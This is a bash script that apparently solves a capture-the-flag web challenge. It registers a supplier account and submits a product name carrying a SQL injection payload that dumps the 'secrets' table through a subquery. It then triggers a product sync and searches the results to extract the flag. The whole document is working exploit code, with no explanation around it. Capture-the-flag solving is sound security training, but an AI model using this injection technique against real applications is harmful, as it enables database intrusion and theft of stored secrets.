#!/usr/bin/env bash
set -euo pipefail

if [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ]; then
  printf 'Usage: %s [base_url]\n' "$0"
  exit 0
fi

base_url="${1:-https://94284f6f0a0f6fc2.chal.ctf.ae}"
marker="solve$(date +%s)"

registration="$(
  curl -k -sS -X POST "${base_url%/}/api/supplier/register" \
    -H "Content-Type: application/json" \
    -d '{"company_name":"writeup-solver","contact_email":"solver@example.com"}'
)"

supplier_id="$(printf '%s' "$registration" | grep -o '"supplier_id":"[^"]*"' | cut -d'"' -f4)"
if [ -z "$supplier_id" ]; then
  printf 'Could not parse supplier_id from response:\n%s\n' "$registration" >&2
  exit 1
fi

payload="{\"name\":\"${marker}',0,(SELECT group_concat(key || ':' || value, '|') FROM secrets))-- \",\"price\":1}"

curl -k -sS -X POST "${base_url%/}/api/supplier/products" \
  -H "X-Supplier-ID: ${supplier_id}" \
  -H "Content-Type: application/json" \
  -d "$payload" >/dev/null

curl -k -sS -X POST "${base_url%/}/api/products/sync" >/dev/null

result="$(curl -k -sS "${base_url%/}/api/products?search=${marker}")"
flag="$(printf '%s' "$result" | grep -o 'flag{[^}]*}' | head -n 1 || true)"

if [ -n "$flag" ]; then
  printf '%s\n' "$flag"
else
  printf '%s\n' "$result"
fi
